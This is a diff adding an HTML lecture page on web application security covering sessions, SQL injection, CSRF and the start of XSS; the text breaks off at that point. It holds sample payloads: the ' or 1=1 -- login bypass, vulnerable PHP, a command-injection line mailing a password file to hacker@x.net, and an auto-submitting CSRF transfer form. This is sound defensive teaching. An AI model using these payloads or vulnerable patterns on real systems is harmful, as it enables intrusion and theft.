@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSF Lec 9 — Web Application Security</title>
+<style>
+  :root {
+    --bg: #0d1117; --surface: #161b22; --surface2: #1c2333; --border: #30363d;
+    --text: #e6edf3; --muted: #8b949e; --accent: #58a6ff; --green: #3fb950;
+    --red: #f85149; --orange: #d29922; --purple: #bc8cff; --cyan: #39d353;
+    --yellow: #e3b341; --pink: #f78166;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; line-height:1.6; }
+
+  /* NAV */
+  nav { position:sticky; top:0; z-index:100; background:rgba(13,17,23,0.95); backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--border); padding:0.6rem 2rem; display:flex; gap:0.5rem; flex-wrap:wrap; align-items:center; }
+  nav a { color:var(--muted); text-decoration:none; font-size:0.78rem; padding:0.3rem 0.7rem;
+    border-radius:6px; transition:all 0.2s; border:1px solid transparent; }
+  nav a:hover { color:var(--accent); border-color:var(--accent); }
+  nav .logo { color:var(--accent); font-weight:700; font-size:0.9rem; margin-right:0.5rem; }
+
+  /* LAYOUT */
+  .hero { background:linear-gradient(135deg,#0d1117 0%,#1a1f35 50%,#0d2137 100%);
+    padding:4rem 2rem; text-align:center; border-bottom:1px solid var(--border); position:relative; overflow:hidden; }
+  .hero::before { content:''; position:absolute; top:-50%; left:-50%; width:200%; height:200%;
+    background:radial-gradient(circle at 50% 50%, rgba(88,166,255,0.06) 0%, transparent 60%); }
+  .hero h1 { font-size:2.8rem; font-weight:700; background:linear-gradient(120deg,var(--accent),var(--purple));
+    -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:0.5rem; }
+  .hero p { color:var(--muted); font-size:1.1rem; }
+  .hero .tags { margin-top:1rem; display:flex; gap:0.5rem; justify-content:center; flex-wrap:wrap; }
+  .tag { background:rgba(88,166,255,0.1); border:1px solid rgba(88,166,255,0.3); color:var(--accent);
+    padding:0.25rem 0.75rem; border-radius:20px; font-size:0.78rem; }
+
+  .container { max-width:1100px; margin:0 auto; padding:2rem; }
+  section { margin-bottom:3rem; }
+  h2 { font-size:1.6rem; color:var(--accent); margin-bottom:1rem; padding-bottom:0.5rem;
+    border-bottom:2px solid var(--border); display:flex; align-items:center; gap:0.5rem; }
+  h3 { font-size:1.15rem; color:var(--yellow); margin:1.2rem 0 0.6rem; }
+  h4 { font-size:1rem; color:var(--purple); margin:0.8rem 0 0.4rem; }
+  p { margin-bottom:0.6rem; color:#cdd9e5; }
+
+  /* CARDS */
+  .card { background:var(--surface); border:1px solid var(--border); border-radius:10px; padding:1.2rem; margin-bottom:1rem; }
+  .card-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:1rem; }
+  .card.accent { border-left:3px solid var(--accent); }
+  .card.red { border-left:3px solid var(--red); }
+  .card.green { border-left:3px solid var(--green); }
+  .card.orange { border-left:3px solid var(--orange); }
+  .card.purple { border-left:3px solid var(--purple); }
+  .card.cyan { border-left:3px solid var(--cyan); }
+
+  /* CODE */
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:8px; padding:1.2rem;
+    overflow-x:auto; font-size:0.85rem; line-height:1.7; margin:0.8rem 0; }
+  code { font-family:'Cascadia Code','Fira Code',monospace; }
+  .kw { color:#ff7b72; } .fn { color:#d2a8ff; } .str { color:#a5d6ff; }
+  .cm { color:#8b949e; font-style:italic; } .var { color:#ffa657; } .num { color:#79c0ff; }
+  .op { color:#ff7b72; }
+
+  /* MATH */
+  .math-box { background:#0a0e1a; border:1px solid #2d3748; border-radius:8px;
+    padding:1rem 1.4rem; margin:0.8rem 0; font-family:'Cascadia Code',monospace;
+    font-size:0.95rem; color:#90cdf4; }
+  .math-box .formula { font-size:1.1rem; color:#63b3ed; margin:0.3rem 0; }
+
+  /* TABLES */
+  table { width:100%; border-collapse:collapse; margin:0.8rem 0; font-size:0.88rem; }
+  th { background:var(--surface2); color:var(--accent); padding:0.6rem 0.8rem; text-align:left; border:1px solid var(--border); }
+  td { padding:0.5rem 0.8rem; border:1px solid var(--border); }
+  tr:nth-child(even) td { background:rgba(255,255,255,0.02); }
+  tr:hover td { background:rgba(88,166,255,0.05); }
+
+  /* ALERTS */
+  .alert { padding:0.9rem 1.2rem; border-radius:8px; margin:0.8rem 0; border-left:4px solid; }
+  .alert.info { background:rgba(88,166,255,0.08); border-color:var(--accent); color:#a5c8ff; }
+  .alert.warn { background:rgba(210,153,34,0.08); border-color:var(--orange); color:#e6c97a; }
+  .alert.danger { background:rgba(248,81,73,0.08); border-color:var(--red); color:#f9a09a; }
+  .alert.success { background:rgba(63,185,80,0.08); border-color:var(--green); color:#88d49a; }
+
+  /* ANIMATIONS */
+  @keyframes fadeIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+  @keyframes flow { 0%{left:-100%} 100%{left:100%} }
+  @keyframes blink { 50%{opacity:0} }
+
+  .animate-in { animation:fadeIn 0.5s ease forwards; }
+
+  /* ATTACK DIAGRAMS */
+  .diagram { background:var(--surface); border:1px solid var(--border); border-radius:12px;
+    padding:1.5rem; margin:1rem 0; position:relative; overflow:hidden; }
+  .diagram-title { font-size:0.8rem; color:var(--muted); text-transform:uppercase;
+    letter-spacing:1px; margin-bottom:1rem; }
+  .flow-container { display:flex; align-items:center; gap:0.5rem; flex-wrap:wrap; justify-content:center; }
+  .flow-node { background:var(--surface2); border:2px solid var(--border); border-radius:8px;
+    padding:0.6rem 1rem; text-align:center; min-width:100px; font-size:0.82rem; position:relative; }
+  .flow-node.attacker { border-color:var(--red); color:var(--red); }
+  .flow-node.server { border-color:var(--accent); color:var(--accent); }
+  .flow-node.user { border-color:var(--green); color:var(--green); }
+  .flow-node.db { border-color:var(--orange); color:var(--orange); }
+  .flow-arrow { color:var(--muted); font-size:1.4rem; flex-shrink:0; }
+  .flow-label { font-size:0.72rem; color:var(--muted); text-align:center; margin-top:0.3rem; }
+
+  /* INTERACTIVE SQL DEMO */
+  .demo-box { background:#0a0e1a; border:1px solid var(--border); border-radius:10px; padding:1.2rem; margin:1rem 0; }
+  .demo-box input { background:#161b22; border:1px solid var(--border); color:var(--text);
+    padding:0.5rem 0.8rem; border-radius:6px; font-family:monospace; font-size:0.9rem;
+    width:100%; margin-bottom:0.6rem; }
+  .demo-box input:focus { outline:none; border-color:var(--accent); }
+  .demo-btn { background:var(--accent); color:#000; border:none; padding:0.5rem 1.2rem;
+    border-radius:6px; cursor:pointer; font-weight:600; margin-right:0.5rem; transition:all 0.2s; }
+  .demo-btn:hover { background:#79b8ff; }
+  .demo-btn.red { background:var(--red); color:#fff; }
+  .demo-btn.red:hover { background:#ff7b72; }
+  .demo-output { margin-top:0.8rem; padding:0.8rem; background:#0d1117; border-radius:6px;
+    font-family:monospace; font-size:0.85rem; min-height:3rem; border:1px solid var(--border); }
+  .demo-output.safe { border-color:var(--green); }
+  .demo-output.danger { border-color:var(--red); }
+
+  /* QUIZ */
+  .quiz-q { background:var(--surface); border:1px solid var(--border); border-radius:10px;
+    padding:1.2rem; margin-bottom:1.2rem; }
+  .quiz-q .question { font-weight:600; margin-bottom:0.8rem; color:var(--text); }
+  .quiz-option { display:flex; align-items:flex-start; gap:0.6rem; padding:0.5rem 0.8rem;
+    margin:0.3rem 0; border-radius:6px; cursor:pointer; border:1px solid transparent;
+    transition:all 0.2s; }
+  .quiz-option:hover { background:rgba(88,166,255,0.05); border-color:var(--accent); }
+  .quiz-option input { margin-top:0.2rem; }
+  .quiz-option.correct { background:rgba(63,185,80,0.1); border-color:var(--green); }
+  .quiz-option.wrong { background:rgba(248,81,73,0.1); border-color:var(--red); }
+  .quiz-explain { margin-top:0.8rem; padding:0.7rem 1rem; background:rgba(88,166,255,0.05);
+    border-left:3px solid var(--accent); border-radius:0 6px 6px 0; font-size:0.88rem;
+    display:none; }
+  .quiz-result { margin-top:1.5rem; text-align:center; padding:1.5rem; background:var(--surface);
+    border-radius:10px; border:1px solid var(--border); }
+  .score-big { font-size:3rem; font-weight:700; }
+
+  /* EXAM SECTION */
+  .exam-q { background:var(--surface); border:1px solid var(--border); border-radius:10px;
+    padding:1.4rem; margin-bottom:1.4rem; }
+  .exam-q .q-header { display:flex; justify-content:space-between; align-items:center;
+    margin-bottom:0.8rem; }
+  .exam-q .q-num { background:var(--accent); color:#000; padding:0.2rem 0.7rem;
+    border-radius:20px; font-weight:700; font-size:0.85rem; }
+  .exam-q .q-marks { color:var(--muted); font-size:0.85rem; }
+  .toggle-btn { background:var(--surface2); border:1px solid var(--border); color:var(--accent);
+    padding:0.4rem 0.9rem; border-radius:6px; cursor:pointer; font-size:0.82rem;
+    transition:all 0.2s; margin-top:0.8rem; }
+  .toggle-btn:hover { background:rgba(88,166,255,0.1); }
+  .solution { display:none; margin-top:0.8rem; padding:1rem; background:#0a0e1a;
+    border-radius:8px; border:1px solid var(--green); }
+  .solution.visible { display:block; animation:fadeIn 0.3s ease; }
+  .mark-badge { display:inline-block; background:rgba(88,166,255,0.1); border:1px solid rgba(88,166,255,0.3);
+    color:var(--accent); padding:0.15rem 0.5rem; border-radius:4px; font-size:0.75rem; margin-left:0.3rem; }
+
+  /* OWASP */
+  .owasp-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:0.7rem; margin:1rem 0; }
+  .owasp-item { background:var(--surface2); border:1px solid var(--border); border-radius:8px;
+    padding:0.7rem 1rem; display:flex; gap:0.6rem; align-items:flex-start; }
+  .owasp-num { background:var(--accent); color:#000; width:24px; height:24px; border-radius:50%;
+    display:flex; align-items:center; justify-content:center; font-size:0.75rem; font-weight:700; flex-shrink:0; margin-top:0.15rem; }
+  .owasp-num.red { background:var(--red); color:#fff; }
+  .owasp-num.orange { background:var(--orange); }
+
+  /* ANIMATED ATTACK */
+  .attack-anim { background:var(--surface); border:1px solid var(--border); border-radius:12px;
+    padding:1.5rem; margin:1rem 0; min-height:200px; }
+  .step-list { counter-reset:steps; }
+  .step-item { counter-increment:steps; display:flex; gap:0.8rem; margin-bottom:0.7rem; padding:0.6rem;
+    background:var(--surface2); border-radius:8px; align-items:flex-start; }
+  .step-item::before { content:counter(steps); background:var(--accent); color:#000; min-width:24px; height:24px;
+    border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.8rem; font-weight:700; flex-shrink:0; }
+  .step-item.red::before { background:var(--red); color:#fff; }
+  .step-item.orange::before { background:var(--orange); }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background:var(--bg); }
+  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+
+  /* PROGRESS BAR */
+  .progress-bar { position:fixed; top:0; left:0; height:3px; background:var(--accent);
+    z-index:200; transition:width 0.1s; }
+
+  /* TABS */
+  .tabs { display:flex; gap:0.3rem; margin-bottom:1rem; border-bottom:1px solid var(--border); }
+  .tab { padding:0.5rem 1rem; cursor:pointer; border-radius:6px 6px 0 0; font-size:0.85rem;
+    color:var(--muted); border:1px solid transparent; border-bottom:none; transition:all 0.2s; }
+  .tab.active { color:var(--accent); border-color:var(--border); background:var(--surface);
+    border-bottom:2px solid var(--accent); }
+  .tab-content { display:none; }
+  .tab-content.active { display:block; animation:fadeIn 0.3s ease; }
+
+  /* CSRF DEMO */
+  .csrf-demo { display:grid; grid-template-columns:1fr 1fr; gap:1rem; }
+  .csrf-site { background:var(--surface2); border:1px solid var(--border); border-radius:8px; padding:1rem; }
+  .csrf-site .site-title { font-size:0.75rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:0.6rem; }
+  .csrf-site.good .site-title { color:var(--green); }
+  .csrf-site.evil .site-title { color:var(--red); }
+  .csrf-site.good { border-top:3px solid var(--green); }
+  .csrf-site.evil { border-top:3px solid var(--red); }
+
+  /* HIGHLIGHT */
+  .hl { color:var(--yellow); font-weight:600; }
+  .hl-red { color:var(--red); font-weight:600; }
+  .hl-green { color:var(--green); font-weight:600; }
+  .hl-blue { color:var(--accent); font-weight:600; }
+
+  @media(max-width:600px) {
+    .hero h1 { font-size:1.8rem; }
+    .csrf-demo { grid-template-columns:1fr; }
+    .flow-container { flex-direction:column; }
+  }
+</style>
+</head>
+<body>
+
+<div class="progress-bar" id="progressBar"></div>
+
+<nav>
+  <span class="logo">CSF Lec 9</span>
+  <a href="#overview">Overview</a>
+  <a href="#http">HTTP/HTTPS</a>
+  <a href="#sqli">SQL Injection</a>
+  <a href="#csrf">CSRF</a>
+  <a href="#xss">XSS</a>
+  <a href="#defences">Defences</a>
+  <a href="#exam">Exam Qs</a>
+  <a href="#extra">Extra Qs</a>
+  <a href="#quiz">Quiz</a>
+</nav>
+
+<div class="hero">
+  <h1>Web Application Security</h1>
+  <p>COMPSCI5063 — Cyber Security Fundamentals — Lecture 9</p>
+  <div class="tags">
+    <span class="tag">SQL Injection</span>
+    <span class="tag">CSRF</span>
+    <span class="tag">XSS</span>
+    <span class="tag">HTTP/HTTPS</span>
+    <span class="tag">OWASP Top 10</span>
+    <span class="tag">PHP Security</span>
+    <span class="tag">Session Management</span>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- ═══════════════════════════════════ OVERVIEW ═══════════════════════════════════ -->
+<section id="overview">
+<h2>📋 Overview: Web Applications & Attack Surface</h2>
+
+<div class="card-grid">
+  <div class="card accent">
+    <h4>What is a Web Application?</h4>
+    <p>An application stored on a <span class="hl">remote server</span>, delivered over the internet through a <span class="hl">browser interface</span>. Examples: online banking, email, social media.</p>
+  </div>
+  <div class="card purple">
+    <h4>HTTP vs HTTPS</h4>
+    <p><span class="hl">HTTP</span> — plain text, vulnerable to sniffing. <span class="hl-green">HTTPS</span> = HTTP + TLS encryption. SSL is deprecated; TLS is the current standard.</p>
+  </div>
+  <div class="card orange">
+    <h4>The 3 Main Threats</h4>
+    <p><span class="hl-red">SQL Injection</span> · <span class="hl-red">CSRF</span> · <span class="hl-red">XSS</span></p>
+    <p style="font-size:0.85rem;color:var(--muted)">All exploit trust relationships between user, browser, and server.</p>
+  </div>
+</div>
+
+<h3>OWASP Top 10 (2021) — Know the Most Important Ones</h3>
+<div class="owasp-grid">
+  <div class="owasp-item"><div class="owasp-num red">1</div><div><strong>Broken Access Control</strong><br><small style="color:var(--muted)">Users act outside intended permissions</small></div></div>
+  <div class="owasp-item"><div class="owasp-num red">2</div><div><strong>Cryptographic Failures</strong><br><small style="color:var(--muted)">Weak/missing encryption</small></div></div>
+  <div class="owasp-item"><div class="owasp-num red">3</div><div><strong>Injection</strong><br><small style="color:var(--muted)">SQL, Command, LDAP injection</small></div></div>
+  <div class="owasp-item"><div class="owasp-num orange">4</div><div><strong>Insecure Design</strong><br><small style="color:var(--muted)">Flawed architecture</small></div></div>
+  <div class="owasp-item"><div class="owasp-num orange">5</div><div><strong>Security Misconfiguration</strong><br><small style="color:var(--muted)">Default passwords, open ports</small></div></div>
+  <div class="owasp-item"><div class="owasp-num">6</div><div><strong>Vulnerable Components</strong><br><small style="color:var(--muted)">Outdated libraries</small></div></div>
+  <div class="owasp-item"><div class="owasp-num">7</div><div><strong>Auth Failures</strong><br><small style="color:var(--muted)">Weak session management</small></div></div>
+  <div class="owasp-item"><div class="owasp-num">8</div><div><strong>Software & Data Integrity</strong><br><small style="color:var(--muted)">CI/CD pipeline attacks</small></div></div>
+  <div class="owasp-item"><div class="owasp-num">9</div><div><strong>Logging Failures</strong><br><small style="color:var(--muted)">No audit trail</small></div></div>
+  <div class="owasp-item"><div class="owasp-num">10</div><div><strong>SSRF</strong><br><small style="color:var(--muted)">Server-side request forgery</small></div></div>
+</div>
+
+<div class="alert info">
+  <strong>Exam tip:</strong> SQL Injection falls under #3 (Injection), XSS under #3 as well, CSRF historically fits under Broken Access Control (#1). Know the top 3 by name.
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ HTTP/HTTPS ═══════════════════════════════════ -->
+<section id="http">
+<h2>🌐 HTTP, HTTPS & Session Management</h2>
+
+<div class="card-grid">
+  <div class="card red">
+    <h4>FTP — Insecure</h4>
+    <p>File Transfer Protocol. Transmits everything in <span class="hl-red">cleartext</span>: usernames, passwords, data. Vulnerable to sniffing attacks.</p>
+  </div>
+  <div class="card accent">
+    <h4>HTTP</h4>
+    <p>Carrier protocol for HTML, CSS, images. No encryption. All data visible on network.</p>
+    <code>http://moodle.gla.ac.uk/course/view.php?id=343</code>
+  </div>
+  <div class="card green">
+    <h4>HTTPS</h4>
+    <p>HTTP + <span class="hl-green">TLS encryption</span>. SSL deprecated. Browser shows 🔒 lock icon. Prevents eavesdropping and man-in-the-middle attacks.</p>
+  </div>
+</div>
+
+<h3>URL Structure</h3>
+<div class="math-box">
+  <div>https://moodle.gla.ac.uk/course/view.php?id=343&notifyeditingon=1</div>
+  <div style="margin-top:0.5rem;font-size:0.82rem;color:var(--muted)">
+    └─ scheme ── host ───────── path ─────── query params ──────────────
+  </div>
+  <div style="margin-top:0.5rem;font-size:0.82rem">
+    <span style="color:var(--green)">https://</span> = scheme &nbsp;|&nbsp;
+    <span style="color:var(--accent)">moodle.gla.ac.uk</span> = host &nbsp;|&nbsp;
+    <span style="color:var(--yellow)">?id=343</span> = query param
+  </div>
+</div>
+
+<h3>Sessions & Cookies</h3>
+<div class="card accent">
+  <p>HTTP is <strong>stateless</strong> — the server doesn't remember you between requests. Sessions solve this.</p>
+  <div class="step-list" style="margin-top:0.8rem;">
+    <div class="step-item"><span>User logs in → server authenticates credentials</span></div>
+    <div class="step-item"><span>Server generates a <span class="hl">random session ID</span> (a large random number)</span></div>
+    <div class="step-item"><span>Session ID stored in a <span class="hl">cookie</span> in the browser</span></div>
+    <div class="step-item"><span>Browser sends cookie with every subsequent request</span></div>
+    <div class="step-item"><span>Server looks up session ID in its cache → knows who you are</span></div>
+  </div>
+</div>
+
+<div class="alert warn">
+  <strong>URL Session IDs (vulnerable approach):</strong> Some sites embed session IDs directly in the URL:
+  <code style="display:block;margin-top:0.5rem">http://example.com/account?sessionid=abc123xyz</code>
+  This is dangerous: IDs can leak via browser history, referer headers, server logs, and shared links.
+</div>
+
+<div class="alert success">
+  <strong>Secure session best practices:</strong> Use HttpOnly + Secure cookie flags · Session timeout after inactivity · Regenerate session ID after login · Use HTTPS only
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ SQL INJECTION ═══════════════════════════════════ -->
+<section id="sqli">
+<h2>💉 SQL Injection</h2>
+
+<div class="diagram">
+  <div class="diagram-title">SQL Injection Attack Flow</div>
+  <div class="flow-container">
+    <div class="flow-node attacker">👤 Attacker<div class="flow-label">crafts malicious input</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-node server">🖥️ Web Server<div class="flow-label">receives input, builds query</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-node db">🗄️ Database<div class="flow-label">executes malicious SQL</div></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-node attacker">💀 Data Stolen<div class="flow-label">bypassed auth / exfiltrated data</div></div>
+  </div>
+</div>
+
+<h3>How it Works — The Classic Login Bypass</h3>
+
+<h4>Normal Query</h4>
+<pre><code><span class="cm">-- User enters: username = "alice", password = "secret"</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> Users <span class="kw">WHERE</span> user=<span class="str">'alice'</span> <span class="kw">AND</span> pwd=<span class="str">'secret'</span>
+<span class="cm">-- Returns: alice's row → login succeeds</span></code></pre>
+
+<h4>SQL Injection Attack</h4>
+<pre><code><span class="cm">-- Attacker enters username = "' or 1=1 --"</span>
+<span class="cm">-- After substitution:</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> Users <span class="kw">WHERE</span> user=<span class="str">''</span> <span class="kw">or</span> <span class="num">1</span>=<span class="num">1</span> <span class="cm">--' AND pwd='anything'</span>
+<span class="cm">--                              ^^^^^^^^              ^^^^^^^^^^^^^^^^^^</span>
+<span class="cm">--                         ALWAYS TRUE              commented out!</span>
+<span class="cm">-- Result: returns ALL rows → login always succeeds!</span></code></pre>
+
+<div class="alert danger">
+  <strong>Why does this work?</strong> The <code>'</code> closes the string literal. <code>OR 1=1</code> makes the condition always true. <code>--</code> comments out the rest, removing the password check.
+</div>
+
+<h3>Interactive SQL Injection Demo</h3>
+<div class="demo-box">
+  <p style="font-size:0.85rem;color:var(--muted);margin-bottom:0.8rem">Simulate what the vulnerable PHP does with your input:</p>
+  <label style="font-size:0.85rem;color:var(--muted)">Username:</label>
+  <input type="text" id="sqliUser" placeholder="Try: alice  OR  ' or 1=1 --  OR  admin'--" value="alice">
+  <label style="font-size:0.85rem;color:var(--muted)">Password:</label>
+  <input type="text" id="sqliPass" placeholder="Try: secret  OR  anything" value="secret">
+  <div style="margin-top:0.5rem">
+    <button class="demo-btn" onclick="runSQLDemo(false)">Normal Login</button>
+    <button class="demo-btn red" onclick="runSQLDemo(true)">Try SQL Injection</button>
+  </div>
+  <div class="demo-output" id="sqliOutput">Query will appear here...</div>
+</div>
+
+<h3>PHP Vulnerable Code vs Secure Code</h3>
+<div class="tabs">
+  <div class="tab active" onclick="switchTab(this,'vuln')">❌ Vulnerable PHP</div>
+  <div class="tab" onclick="switchTab(this,'secure')">✅ Secure PHP (Prepared Statements)</div>
+  <div class="tab" onclick="switchTab(this,'orm')">✅ ORM Approach</div>
+</div>
+<div class="tab-content active" id="tab-vuln">
+<pre><code><span class="cm">// VULNERABLE: direct string concatenation</span>
+<span class="var">$username</span> = <span class="var">$_POST</span>[<span class="str">'username'</span>];
+<span class="var">$password</span> = <span class="var">$_POST</span>[<span class="str">'password'</span>];
+
+<span class="var">$sql</span> = <span class="str">"SELECT * FROM Users WHERE user='<span class="var">$username</span>' AND pwd='<span class="var">$password</span>'"</span>;
+<span class="var">$result</span> = <span class="var">$db</span>-><span class="fn">executeQuery</span>(<span class="var">$sql</span>);
+<span class="cm">// If $username = "' or 1=1 --" → authentication bypass!</span></code></pre>
+</div>
+<div class="tab-content" id="tab-secure">
+<pre><code><span class="cm">// SECURE: Parameterized / Prepared Statements</span>
+<span class="var">$username</span> = <span class="var">$_POST</span>[<span class="str">'username'</span>];
+<span class="var">$password</span> = <span class="var">$_POST</span>[<span class="str">'password'</span>];
+
+<span class="cm">// ? placeholders — value NEVER interpreted as SQL code</span>
+<span class="var">$stmt</span> = <span class="var">$pdo</span>-><span class="fn">prepare</span>(<span class="str">"SELECT * FROM Users WHERE user=? AND pwd=?"</span>);
+<span class="var">$stmt</span>-><span class="fn">execute</span>([<span class="var">$username</span>, <span class="var">$password</span>]);
+<span class="var">$result</span> = <span class="var">$stmt</span>-><span class="fn">fetchAll</span>();
+<span class="cm">// Even "' or 1=1 --" is treated as a literal string, not SQL!</span></code></pre>
+</div>
+<div class="tab-content" id="tab-orm">
+<pre><code><span class="cm">// ORM (e.g., Eloquent/Laravel) — never write raw SQL</span>
+<span class="cm">// High-level object code → ORM generates safe parameterised SQL</span>
+<span class="var">$user</span> = <span class="fn">User</span>::<span class="fn">where</span>(<span class="str">'username'</span>, <span class="var">$username</span>)
+           -><span class="fn">where</span>(<span class="str">'password'</span>, <span class="fn">hash</span>(<span class="var">$password</span>))
+           -><span class="fn">first</span>();
+<span class="cm">// ORM = abstraction layer; no raw SQL = no injection surface</span></code></pre>
+</div>
+
+<h3>Command Injection (Related Attack)</h3>
+<pre><code><span class="cm">// Vulnerable PHP using system()</span>
+<span class="var">$email</span> = <span class="var">$_POST</span>[<span class="str">'email'</span>];
+<span class="var">$subject</span> = <span class="var">$_POST</span>[<span class="str">'subject'</span>];
+<span class="fn">system</span>(<span class="str">"mail $email -s $subject &lt; /tmp/joinmynetwork"</span>);
+
+<span class="cm">// Normal: email=alice@example.com, subject=hello</span>
+<span class="cm">// Malicious: email=hacker@x.net &amp; subject=foo &lt; /usr/passwd; ls</span>
+<span class="cm">// Executed: mail hacker@x.net -s foo &lt; /usr/passwd; ls</span>
+<span class="cm">// Result: /etc/passwd sent to attacker! Then 'ls' runs!</span></code></pre>
+
+<div class="alert danger">
+  <strong>Real-world example — CardSystems (2005):</strong> SQL injection attack against a credit card payment processor. 263,000 card numbers <em>stolen</em>, 43 million <em>exposed</em>. Company was put out of business. All data stored unencrypted.
+</div>
+
+<h3>SQL Injection Prevention Summary</h3>
+<table>
+  <tr><th>Method</th><th>Description</th><th>Effectiveness</th></tr>
+  <tr><td><strong>Prepared Statements</strong></td><td>? placeholders; values never interpreted as SQL</td><td style="color:var(--green)">★★★★★ Best</td></tr>
+  <tr><td><strong>ORM Framework</strong></td><td>Abstraction layer; auto-generates safe SQL</td><td style="color:var(--green)">★★★★★ Best</td></tr>
+  <tr><td><strong>Input Validation</strong></td><td>Whitelist allowed chars; reject dangerous chars</td><td style="color:var(--yellow)">★★★ Partial</td></tr>
+  <tr><td><strong>Escaping</strong></td><td>Escape special chars before insertion</td><td style="color:var(--yellow)">★★★ Partial</td></tr>
+  <tr><td><strong>Least privilege DB user</strong></td><td>App DB user has minimum permissions</td><td style="color:var(--orange)">★★ Defence-in-depth</td></tr>
+</table>
+</section>
+
+<!-- ═══════════════════════════════════ CSRF ═══════════════════════════════════ -->
+<section id="csrf">
+<h2>🎭 Cross-Site Request Forgery (CSRF)</h2>
+
+<div class="alert info">
+  <strong>Core idea:</strong> The attacker tricks a logged-in user's browser into sending a request to a legitimate site — using the user's own session cookie — without the user's knowledge. Also called <em>session riding</em> or <em>one-click attack</em>.
+</div>
+
+<h3>Attack Flow — Step by Step</h3>
+<div class="step-list">
+  <div class="step-item"><span>User logs into <code>www.good-banking-site.com</code>. Server issues an <span class="hl">authentication cookie</span>.</span></div>
+  <div class="step-item red"><span>User visits <code>www.evil-crook-site.com</code> (maybe from a phishing link).</span></div>
+  <div class="step-item red"><span>Evil site contains a hidden HTML form with <code>action="www.good-banking-site.com/transfer"</code>.</span></div>
+  <div class="step-item red"><span>Form auto-submits via JavaScript, sending a <span class="hl-red">transfer $1000 to attacker</span> request.</span></div>
+  <div class="step-item red"><span>Browser automatically attaches the <span class="hl-red">banking site cookie</span> — server thinks it's the real user!</span></div>
+  <div class="step-item"><span>Bank executes the transfer. User never knew.</span></div>
+</div>
+
+<h3>CSRF Attack — The Evil Form</h3>
+<div class="csrf-demo">
+  <div class="csrf-site good">
+    <div class="site-title">✅ Legitimate Bank Site</div>
+    <pre style="font-size:0.78rem;padding:0.6rem;background:#0a0e1a;border-radius:6px"><code><span class="cm">&lt;!-- Legit form --&gt;</span>
+&lt;<span class="kw">form</span> action=<span class="str">"/transfer"</span>&gt;
+  To: &lt;<span class="kw">input</span> name=<span class="str">"to"</span>&gt;
+  Amount: &lt;<span class="kw">input</span> name=<span class="str">"amount"</span>&gt;
+  &lt;<span class="kw">button</span>&gt;Submit&lt;/<span class="kw">button</span>&gt;
+&lt;/<span class="kw">form</span>&gt;</code></pre>
+  </div>
+  <div class="csrf-site evil">
+    <div class="site-title">❌ Evil Attacker Site</div>
+    <pre style="font-size:0.78rem;padding:0.6rem;background:#0a0e1a;border-radius:6px"><code><span class="cm">&lt;!-- Hidden CSRF form --&gt;</span>
+&lt;<span class="kw">form</span> id=<span class="str">"csrf"</span>
+  action=<span class="str">"https://bank.com/transfer"</span>
+  method=<span class="str">"POST"</span> hidden&gt;
+  &lt;<span class="kw">input</span> name=<span class="str">"to"</span> value=<span class="str">"attacker"</span>&gt;
+  &lt;<span class="kw">input</span> name=<span class="str">"amount"</span> value=<span class="str">"1000"</span>&gt;
+&lt;/<span class="kw">form</span>&gt;
+&lt;<span class="kw">script</span>&gt;
+  document.getElementById(<span class="str">'csrf'</span>).submit();
+&lt;/<span class="kw">script</span>&gt;</code></pre>
+  </div>
+</div>
+
+<h3>Why Browsers Enable This</h3>
+<div class="card orange">
+  <p>Web browsers automatically attach cookies when making requests to a domain. This is by design (for usability). CSRF exploits this expected behaviour — the bank's server sees valid session cookie and trusts the request.</p>
+</div>
+
+<h3>CSRF Defences</h3>
+<div class="card-grid">
+  <div class="card green">
+    <h4>CSRF Token (Best Defence)</h4>
+    <p>Server generates a <span class="hl-green">unique random token</span> per session. Token embedded in every form. Server validates token on submission. Attacker cannot forge it (they can't read the victim's page).</p>
+    <pre style="font-size:0.78rem"><code>&lt;input type="hidden" name="csrf_token"
+  value="xK9mN2pQ7rL4sT1wV8yB3cE6hJ5aD0fG"&gt;</code></pre>
+  </div>
+  <div class="card accent">
+    <h4>SameSite Cookie Attribute</h4>
+    <p>Browser only sends cookie if request originates from same site. Prevents cross-site cookie sending at the browser level.</p>
+    <pre style="font-size:0.78rem"><code>Set-Cookie: session=abc123;
+  SameSite=Strict; Secure; HttpOnly</code></pre>
+  </div>
+  <div class="card purple">
+    <h4>Additional Defences</h4>
+    <ul style="padding-left:1.2rem;font-size:0.88rem">
+      <li>Use HTTPS throughout</li>
+      <li>Check Referer/Origin header</li>
+      <li>Re-authenticate for sensitive actions</li>
+      <li>Don't use GET for state-changing actions</li>
+    </ul>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ XSS ═══════════════════════════════════ -->
+<section id="xss">
+<h2>⚡ Cross-Site Scripting (XSS)</h2>
+
+<div class="alert info">
+  <strong>Core idea:</strong> Attacker injects malicious JavaScript into a trusted website. The victim's browser executes that script — trusting it because it appears to come from a legitimate site.
+</div>
+
+<h3>Two Types of XSS</h3>
+<div class="card-grid">
+  <div class="card red">
+    <h4>Type 1: Reflected XSS</h4>
